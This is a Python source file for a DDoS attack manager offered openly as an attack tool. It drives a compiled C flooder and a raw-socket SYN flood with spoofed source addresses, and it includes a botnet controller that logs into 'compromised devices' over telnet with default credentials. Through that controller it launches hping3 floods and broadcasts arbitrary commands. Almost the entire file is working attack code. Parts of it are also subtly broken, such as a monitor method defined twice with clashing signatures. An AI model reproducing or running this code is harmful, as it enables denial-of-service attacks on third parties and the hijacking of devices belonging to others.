#!/usr/bin/env python3
"""
DDoS Attack Manager
Interfaces between Python and C for high-performance attacks
"""

import os
import sys
import time
import signal
import subprocess
import threading
import socket
import json
import random
import struct
from typing import List, Dict, Optional, Tuple

class DDoSAttack:
    """
    DDoS Attack manager using C-based attack tool
    """
    
    def __init__(self, c_ddos_path: str = "./ddos_tool"):
        """
        Initialize DDoS Attack Manager
        
        Args:
            c_ddos_path: Path to compiled C DDoS tool
        """
        self.c_ddos_path = c_ddos_path
        self.active_attacks = {}
        self.attack_lock = threading.Lock()
        
        # Ensure C tool is compiled and executable
        self._check_tool()
    
    def _check_tool(self):
        """Check if C DDoS tool exists and is executable"""
        # If not compiled, try to compile it
        if not os.path.exists(self.c_ddos_path):
            print("[*] DDoS tool not found, attempting to compile...")
            
            try:
                # Get directory of current file
                base_dir = os.path.dirname(os.path.abspath(__file__))
                c_source = os.path.join(base_dir, "ddos_tool.c")
                
                if not os.path.exists(c_source):
                    print(f"[-] Source file {c_source} not found!")
                    return
                
                # Compile
                compile_cmd = f"gcc -o {self.c_ddos_path} {c_source} -lpthread"
                print(f"[*] Running: {compile_cmd}")
                
                result = subprocess.run(
                    compile_cmd, 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE
                )
                
                if result.returncode == 0:
                    print("[+] Compilation successful!")
                    # Make executable
                    os.chmod(self.c_ddos_path, 0o755)
                else:
                    print(f"[-] Compilation failed: {result.stderr.decode()}")
                
            except Exception as e:
                print(f"[-] Error compiling C tool: {e}")
    
    def start_attack(self, target_ip: str, target_port: int = 80,
                    attack_type: str = "syn", duration: int = 60, 
                    threads: int = 10, packet_rate: int = 1000) -> Optional[int]:
        """
        Start DDoS attack
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            attack_type: Attack type (syn, udp, tcp)
            duration: Attack duration in seconds
            threads: Number of threads to use
            packet_rate: Packets per second per thread
        
        Returns:
            Attack ID if successful, None otherwise
        """        # Map attack type to numeric code for C tool
        attack_type_map = {
            "syn": 1,
            "udp": 2,
            "tcp": 3
        }
        
        # Use pure Python implementation for SYN flood if specified
        if attack_type.lower() == "syn_python":
            return self.syn_flood_attack(target_ip, target_port, duration, threads)
        
        if attack_type.lower() not in attack_type_map:
            print(f"[-] Unknown attack type: {attack_type}")
            return None
        
        attack_code = attack_type_map[attack_type.lower()]
        
        # Generate unique attack ID
        attack_id = int(time.time())
        
        try:
            # Prepare command
            cmd = [
                self.c_ddos_path,
                target_ip,
                str(target_port),
                str(attack_code),
                str(duration),
                str(threads),
                str(packet_rate)
            ]
            
            print(f"[+] Starting DDoS attack #{attack_id}:")
            print(f"    - Target: {target_ip}:{target_port}")
            print(f"    - Type: {attack_type.upper()}")
            print(f"    - Duration: {duration} seconds")
            print(f"    - Threads: {threads}")
            print(f"    - Rate: {packet_rate} pps/thread")
            
            # Start attack process
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=1,
                universal_newlines=True
            )
            
            # Record attack info
            with self.attack_lock:
                self.active_attacks[attack_id] = {
                    'target_ip': target_ip,
                    'target_port': target_port,
                    'attack_type': attack_type,
                    'start_time': time.time(),
                    'duration': duration,
                    'process': process,
                    'status': 'running'
                }
            
            # Start monitoring thread
            monitor_thread = threading.Thread(
                target=self._monitor_attack,
                args=(attack_id,),
                daemon=True
            )
            monitor_thread.start()
            
            return attack_id
            
        except Exception as e:
            print(f"[-] Error starting attack: {e}")
            return None
    
    def stop_attack(self, attack_id: int) -> bool:
        """
        Stop a running attack
        
        Args:
            attack_id: ID of attack to stop
        
        Returns:
            True if stopped, False otherwise
        """
        with self.attack_lock:
            if attack_id not in self.active_attacks:
                print(f"[-] Attack {attack_id} not found")
                return False
            
            attack_info = self.active_attacks[attack_id]
            
            if attack_info['status'] != 'running':
                print(f"[-] Attack {attack_id} is not running")
                return False
            
            try:
                # Terminate process
                process = attack_info['process']
                if process:
                    process.terminate()
                    process.wait(timeout=5)
                
                print(f"[+] Attack {attack_id} stopped")
                attack_info['status'] = 'stopped'
                attack_info['end_time'] = time.time()
                
                return True
                
            except Exception as e:
                print(f"[-] Error stopping attack {attack_id}: {e}")
                return False
    
    def stop_all_attacks(self) -> int:
        """
        Stop all running attacks
        
        Returns:
            Number of attacks stopped
        """
        with self.attack_lock:
            attack_ids = list(self.active_attacks.keys())
        
        stopped_count = 0
        for attack_id in attack_ids:
            if self.stop_attack(attack_id):
                stopped_count += 1
        
        return stopped_count
    
    def get_attack_status(self, attack_id: int) -> Optional[Dict]:
        """
        Get status of a specific attack
        
        Args:
            attack_id: ID of attack to check
        
        Returns:
            Attack status dict or None if not found
        """
        with self.attack_lock:
            if attack_id not in self.active_attacks:
                return None
            
            # Create a copy without process object
            attack_info = self.active_attacks[attack_id].copy()
            attack_info.pop('process', None)
            
            # Calculate elapsed time
            attack_info['elapsed'] = time.time() - attack_info['start_time']
            
            return attack_info
    
    def get_active_attacks(self) -> List[Dict]:
        """
        Get all active attacks
        
        Returns:
            List of attack status dicts
        """
        active_attacks = []
        
        with self.attack_lock:
            for attack_id, attack_info in self.active_attacks.items():
                if attack_info['status'] == 'running':
                    # Create a copy without process object
                    attack_status = attack_info.copy()
                    attack_status.pop('process', None)
                    attack_status['attack_id'] = attack_id
                    attack_status['elapsed'] = time.time() - attack_status['start_time']
                    
                    active_attacks.append(attack_status)
        
        return active_attacks
    
    def _monitor_attack(self, attack_id: int):
        """
        Monitor attack process and update status
        
        Args:
            attack_id: ID of attack to monitor
        """
        try:
            with self.attack_lock:
                if attack_id not in self.active_attacks:
                    return
                
                attack_info = self.active_attacks[attack_id]
                process = attack_info['process']
            
            # Wait for process to finish
            stdout, stderr = process.communicate()
            
            with self.attack_lock:
                if attack_id in self.active_attacks:
                    self.active_attacks[attack_id]['status'] = 'completed'
                    self.active_attacks[attack_id]['end_time'] = time.time()
                    
                    # Store output
                    self.active_attacks[attack_id]['stdout'] = stdout
                    self.active_attacks[attack_id]['stderr'] = stderr
            
            print(f"[+] Attack {attack_id} finished")
            
        except Exception as e:
            print(f"[-] Error monitoring attack {attack_id}: {e}")

    def syn_flood_attack(self, target_ip: str, target_port: int, 
                      duration: int = 60, threads: int = 5) -> bool:
        """
        Perform a SYN flood attack using raw sockets (Mirai-inspired)
        This is a pure Python implementation that doesn't rely on external tools
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            duration: Attack duration in seconds
            threads: Number of attack threads
            
        Returns:
            Success status
        """
        # Create attack ID
        import random
        attack_id = random.randint(10000, 99999)
        
        # Store attack info
        with self.attack_lock:
            self.active_attacks[attack_id] = {
                'target_ip': target_ip,
                'target_port': target_port,
                'attack_type': 'syn_flood_python',
                'start_time': time.time(),
                'duration': duration,
                'threads': [],
                'packets_sent': 0,
                'status': 'starting'
            }
        
        # Create and start attack threads
        stop_event = threading.Event()
        counter_lock = threading.Lock()
        counter = {'packets': 0}
        
        for i in range(threads):
            thread = threading.Thread(
                target=self._syn_flood_thread,
                args=(target_ip, target_port, duration, stop_event, counter, counter_lock),
                daemon=True
            )
            thread.start()
            
            with self.attack_lock:
                self.active_attacks[attack_id]['threads'].append(thread)
                self.active_attacks[attack_id]['status'] = 'running'
        
        # Create monitor thread to stop attack after duration
        monitor = threading.Thread(
            target=self._monitor_attack,
            args=(attack_id, duration, stop_event),
            daemon=True
        )
        monitor.start()
        
        print(f"[+] Started Python SYN flood attack on {target_ip}:{target_port} with {threads} threads for {duration}s")
        print(f"[+] Attack ID: {attack_id}")
        
        return True
    
    def _syn_flood_thread(self, target_ip: str, target_port: int, duration: int, 
                          stop_event: threading.Event, counter: dict, counter_lock: threading.Lock):
        """Thread function for SYN flooding"""
        try:
            # Create raw socket
            if os.name == 'nt':  # Windows
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            else:  # Linux
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Set socket timeout
            sock.settimeout(2)
            
            # Attack until stop event is set or duration exceeded
            start_time = time.time()
            end_time = start_time + duration
            
            while not stop_event.is_set() and time.time() < end_time:
                # Generate a random source IP (spoofed)
                src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                src_port = random.randint(1024, 65535)
                
                # Create IP header
                ip_header = self._create_ip_header(src_ip, target_ip)
                
                # Create TCP header with SYN flag
                tcp_header = self._create_tcp_syn_header(src_ip, src_port, target_ip, target_port)
                
                # Send the packet
                packet = ip_header + tcp_header
                try:
                    sock.sendto(packet, (target_ip, 0))
                    
                    # Update counter
                    with counter_lock:
                        counter['packets'] += 1
                        
                    # Small delay to not overwhelm the system
                    time.sleep(0.001)
                except:
                    pass
                
        except Exception as e:
            print(f"[!] SYN flood thread error: {e}")
        finally:
            try:
                sock.close()
            except:
                pass
    
    def _create_ip_header(self, src_ip: str, dst_ip: str) -> bytes:
        """Create an IP header for raw packet"""
        # IP header fields
        ip_ihl = 5  # Internet Header Length
        ip_ver = 4  # Version 4
        ip_tos = 0  # Type of service
        ip_tot_len = 20 + 20  # IP header + TCP header
        ip_id = random.randint(1, 65535)  # ID field
        ip_frag_off = 0  # Fragment offset
        ip_ttl = 255  # Time to live
        ip_proto = socket.IPPROTO_TCP  # Protocol TCP
        ip_check = 0  # Header checksum (filled by kernel)
        ip_saddr = socket.inet_aton(src_ip)  # Source address
        ip_daddr = socket.inet_aton(dst_ip)  # Destination address

        ip_ihl_ver = (ip_ver << 4) + ip_ihl

        # Create IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                              ip_frag_off, ip_ttl, ip_proto, ip_check,
                              ip_saddr, ip_daddr)
        
        return ip_header
    
    def _create_tcp_syn_header(self, src_ip: str, src_port: int, dst_ip: str, dst_port: int) -> bytes:
        """Create a TCP header with SYN flag set"""
        # TCP header fields
        tcp_source = src_port  # Source port
        tcp_dest = dst_port  # Destination port
        tcp_seq = random.randint(1000000000, 9000000000)  # Sequence number
        tcp_ack_seq = 0  # Acknowledgment number
        tcp_doff = 5  # Data offset
        tcp_fin = 0  # FIN flag
        tcp_syn = 1  # SYN flag
        tcp_rst = 0  # RST flag
        tcp_psh = 0  # PSH flag
        tcp_ack = 0  # ACK flag
        tcp_urg = 0  # URG flag
        tcp_window = socket.htons(5840)  # Window size
        tcp_check = 0  # Checksum (filled later)
        tcp_urg_ptr = 0  # Urgent pointer

        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)

        # Create TCP header
        tcp_header = struct.pack('!HHLLBBHHH',
                               tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                               tcp_offset_res, tcp_flags, tcp_window,
                               tcp_check, tcp_urg_ptr)
        
        # Create pseudo-header for checksum calculation
        src_addr = socket.inet_aton(src_ip)
        dst_addr = socket.inet_aton(dst_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        # Calculate checksum
        tcp_check = self._checksum(psh)
        
        # Recreate TCP header with checksum
        tcp_header = struct.pack('!HHLLBBHHH',
                               tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                               tcp_offset_res, tcp_flags, tcp_window,
                               tcp_check, tcp_urg_ptr)
        
        return tcp_header
    
    def _checksum(self, data: bytes) -> int:
        """Calculate checksum for packet header"""
        checksum = 0
        data_len = len(data)
        
        # Handle odd-length data
        if (data_len % 2) == 1:
            data_len += 1
            data += struct.pack('B', 0)
        
        # Process data 2 bytes at a time
        for i in range(0, data_len, 2):
            w = (data[i] << 8) + data[i+1]
            checksum += w
        
        # Handle overflow
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum += (checksum >> 16)
        
        # One's complement
        checksum = ~checksum & 0xffff
        
        return checksum
    
    def _monitor_attack(self, attack_id: int, duration: int, stop_event: threading.Event):
        """Monitor and stop attack after duration"""
        time.sleep(duration)
        
        # Set stop event
        stop_event.set()
        
        # Update attack status
        with self.attack_lock:
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id]['status'] = 'completed'
                
                # Calculate packets sent
                if 'counter' in self.active_attacks[attack_id]:
                    packets = self.active_attacks[attack_id]['counter'].get('packets', 0)
                    self.active_attacks[attack_id]['packets_sent'] = packets
                
                print(f"[+] Attack {attack_id} completed. Duration: {duration}s")

class TelnetAttackHandler:
    """Handle telnet-based attacks to compromised devices"""
    
    def __init__(self):
        """Initialize telnet attack handler"""
        self.compromised_devices = {}
        self.active_ddos = {}
    
    def add_device(self, ip: str, port: int, username: str, password: str):
        """Add a compromised device"""
        self.compromised_devices[ip] = {
            'ip': ip,
            'port': port,
            'username': username,
            'password': password,
            'verified': False,
            'commands_sent': 0
        }
    
    def verify_device(self, ip: str) -> bool:
        """Verify connection to device"""
        import telnetlib
        
        if ip not in self.compromised_devices:
            print(f"[-] Device {ip} not found")
            return False
        
        device = self.compromised_devices[ip]
        
        try:
            # Connect
            tn = telnetlib.Telnet(device['ip'], device['port'], timeout=5)
            
            # Login
            tn.read_until(b"login:", timeout=5)
            tn.write(device['username'].encode('utf-8') + b"\n")
            
            tn.read_until(b"assword:", timeout=5)
            tn.write(device['password'].encode('utf-8') + b"\n")
            
            # Check for successful login
            response = tn.read_until(b"#", timeout=5).decode('utf-8', errors='ignore')
            
            if "#" in response or "$" in response or ">" in response:
                # Success
                tn.write(b"exit\n")
                tn.close()
                
                device['verified'] = True
                print(f"[+] Device {ip} verified")
                return True
            else:
                # Failed
                tn.close()
                print(f"[-] Failed to verify device {ip}")
                return False
                
        except Exception as e:
            print(f"[-] Error verifying device {ip}: {e}")
            return False
    
    def start_ddos_via_botnet(self, target_ip: str, target_port: int = 80,
                             attack_type: str = "syn", duration: int = 60) -> bool:
        """
        Start DDoS attack via compromised devices (telnet)
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            attack_type: Attack type (syn, udp, icmp)
            duration: Attack duration in seconds
        
        Returns:
            True if attack started, False otherwise
        """
        # Map attack types to hping3 parameters
        attack_params = {
            "syn": "-S --flood",
            "udp": "--udp --flood",
            "icmp": "-1 --flood"
        }
        
        if attack_type.lower() not in attack_params:
            print(f"[-] Unknown attack type: {attack_type}")
            return False
        
        attack_param = attack_params[attack_type.lower()]
        
        # Build command
        hping_cmd = f"sudo hping3 -c 1000000 -d 120 -p {target_port} {attack_param} {target_ip}"
        
        # Prepare kill command for later
        kill_cmd = "sudo pkill -f hping3"
        
        # Generate attack ID
        attack_id = int(time.time())
        
        # Track devices used in this attack
        participating_devices = []
        
        # Send command to each device
        for ip, device in list(self.compromised_devices.items()):
            try:
                if not device['verified']:
                    if not self.verify_device(ip):
                        continue
                
                # Connect via telnet
                import telnetlib
                tn = telnetlib.Telnet(device['ip'], device['port'], timeout=5)
                
                # Login
                tn.read_until(b"login:", timeout=5)
                tn.write(device['username'].encode('utf-8') + b"\n")
                
                tn.read_until(b"assword:", timeout=5)
                tn.write(device['password'].encode('utf-8') + b"\n")
                
                # Send attack command (in background)
                time.sleep(1)
                tn.write(f"{hping_cmd} > /dev/null 2>&1 &\n".encode('utf-8'))
                time.sleep(0.5)
                
                # Exit
                tn.write(b"exit\n")
                tn.close()
                
                device['commands_sent'] += 1
                participating_devices.append(ip)
                
                print(f"[+] DDoS command sent to {ip}")
                
            except Exception as e:
                print(f"[-] Failed to send command to {ip}: {e}")
        
        # Record attack
        if participating_devices:
            self.active_ddos[attack_id] = {
                'target_ip': target_ip,
                'target_port': target_port,
                'attack_type': attack_type,
                'duration': duration,
                'start_time': time.time(),
                'devices': participating_devices,
                'status': 'active'
            }
            
            # Schedule attack stop
            stop_timer = threading.Timer(
                duration,
                self.stop_ddos,
                args=[attack_id]
            )
            stop_timer.daemon = True
            stop_timer.start()
            
            print(f"[+] Botnet DDoS attack started with {len(participating_devices)} devices")
            print(f"    - Attack ID: {attack_id}")
            print(f"    - Target: {target_ip}:{target_port}")
            print(f"    - Type: {attack_type}")
            print(f"    - Duration: {duration} seconds")
            
            return True
        else:
            print("[-] No devices available for attack")
            return False
    
    def stop_ddos(self, attack_id: int) -> bool:
        """
        Stop DDoS attack
        
        Args:
            attack_id: ID of attack to stop
        
        Returns:
            True if stopped, False otherwise
        """
        if attack_id not in self.active_ddos:
            print(f"[-] Attack {attack_id} not found")
            return False
        
        attack = self.active_ddos[attack_id]
        
        # Kill command
        kill_cmd = "sudo pkill -f hping3"
        
        # Send kill command to each device
        for ip in attack['devices']:
            try:
                if ip not in self.compromised_devices:
                    continue
                
                device = self.compromised_devices[ip]
                
                # Connect via telnet
                import telnetlib
                tn = telnetlib.Telnet(device['ip'], device['port'], timeout=5)
                
                # Login
                tn.read_until(b"login:", timeout=5)
                tn.write(device['username'].encode('utf-8') + b"\n")
                
                tn.read_until(b"assword:", timeout=5)
                tn.write(device['password'].encode('utf-8') + b"\n")
                
                # Send kill command
                tn.write(f"{kill_cmd}\n".encode('utf-8'))
                time.sleep(0.5)
                
                # Exit
                tn.write(b"exit\n")
                tn.close()
                
                print(f"[+] Kill command sent to {ip}")
                
            except Exception as e:
                print(f"[-] Failed to send kill command to {ip}: {e}")
        
        # Update attack status
        attack['status'] = 'stopped'
        attack['end_time'] = time.time()
        
        print(f"[+] Botnet DDoS attack {attack_id} stopped")
        
        return True
    
    def stop_all_ddos(self) -> int:
        """
        Stop all DDoS attacks
        
        Returns:
            Number of attacks stopped
        """
        stopped_count = 0
        
        for attack_id in list(self.active_ddos.keys()):
            if self.stop_ddos(attack_id):
                stopped_count += 1
        
        return stopped_count
    
    def get_active_attacks(self) -> List[Dict]:
        """Get active DDoS attacks"""
        active_attacks = []
        
        for attack_id, attack in self.active_ddos.items():
            if attack['status'] == 'active':
                attack_copy = attack.copy()
                attack_copy['attack_id'] = attack_id
                attack_copy['elapsed'] = time.time() - attack['start_time']
                active_attacks.append(attack_copy)
        
        return active_attacks
    
    def execute_command_on_device(self, ip: str, command: str) -> Optional[str]:
        """
        Execute command on a specific device
        
        Args:
            ip: Device IP address
            command: Command to execute
        
        Returns:
            Command output or None if failed
        """
        if ip not in self.compromised_devices:
            print(f"[-] Device {ip} not found")
            return None
        
        device = self.compromised_devices[ip]
        
        try:
            # Connect via telnet
            import telnetlib
            tn = telnetlib.Telnet(device['ip'], device['port'], timeout=5)
            
            # Login
            tn.read_until(b"login:", timeout=5)
            tn.write(device['username'].encode('utf-8') + b"\n")
            
            tn.read_until(b"assword:", timeout=5)
            tn.write(device['password'].encode('utf-8') + b"\n")
            
            # Wait for prompt
            tn.read_until(b"#", timeout=2)
            
            # Send command
            tn.write(f"{command}\n".encode('utf-8'))
            time.sleep(1)
            
            # Get output
            output = tn.read_until(b"#", timeout=5).decode('utf-8', errors='ignore')
            
            # Exit
            tn.write(b"exit\n")
            tn.close()
            
            # Parse output (remove command from output)
            lines = output.split('\n')
            if len(lines) > 0:
                filtered_output = '\n'.join(lines[1:-1])
            else:
                filtered_output = output
            
            device['commands_sent'] += 1
            
            return filtered_output.strip()
            
        except Exception as e:
            print(f"[-] Failed to execute command on {ip}: {e}")
            return None
    
    def broadcast_command(self, command: str) -> Dict:
        """
        Broadcast command to all compromised devices
        
        Args:
            command: Command to execute
        
        Returns:
            Dictionary of {device_ip: output} pairs
        """
        results = {}
        
        for ip in list(self.compromised_devices.keys()):
            output = self.execute_command_on_device(ip, command)
            results[ip] = output
        
        return results

# Example usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 3:
        print("Usage:")
        print("  python ddos_manager.py direct <target_ip> [<port>] [<type>] [<duration>]")
        print("  python ddos_manager.py botnet <target_ip> [<port>] [<type>] [<duration>]")
        print("")
        print("Examples:")
        print("  python ddos_manager.py direct 192.168.1.100 80 syn 60")
        print("  python ddos_manager.py botnet 192.168.1.100 80 udp 30")
        sys.exit(1)
    
    mode = sys.argv[1].lower()
    target_ip = sys.argv[2]
    target_port = int(sys.argv[3]) if len(sys.argv) > 3 else 80
    attack_type = sys.argv[4] if len(sys.argv) > 4 else "syn"
    duration = int(sys.argv[5]) if len(sys.argv) > 5 else 60
    
    if mode == "direct":
        # Direct attack using C tool
        attack = DDoSAttack()
        
        # Start attack
        attack_id = attack.start_attack(
            target_ip, 
            target_port, 
            attack_type, 
            duration,
            threads=10,
            packet_rate=1000
        )
        
        if attack_id:
            print(f"[+] Attack {attack_id} started")
            
            try:
                # Wait for attack to finish
                while duration > 0:
                    status = attack.get_attack_status(attack_id)
                    if status and status['status'] == 'running':
                        print(f"[*] Attack running for {int(status['elapsed'])} seconds...")
                        time.sleep(5)
                        duration -= 5
                    else:
                        break
                        
                print("[+] Attack completed")
                
            except KeyboardInterrupt:
                print("\n[!] Attack interrupted")
                attack.stop_attack(attack_id)
                
    elif mode == "botnet":
        # Botnet attack using telnet
        handler = TelnetAttackHandler()
        
        # Add example device (would normally be added from scan results)
        handler.add_device("192.168.1.101", 23, "admin", "admin")
        handler.add_device("192.168.1.102", 23, "root", "password")
        
        # Start attack
        if handler.start_ddos_via_botnet(target_ip, target_port, attack_type, duration):
            try:
                # Wait for attack to finish
                while duration > 0:
                    print(f"[*] Botnet attack running, {duration} seconds remaining...")
                    time.sleep(5)
                    duration -= 5
                    
                print("[+] Attack completed")
                
            except KeyboardInterrupt:
                print("\n[!] Attack interrupted")
                handler.stop_all_ddos()
                
    else:
        print(f"[-] Unknown mode: {mode}")
        sys.exit(1)
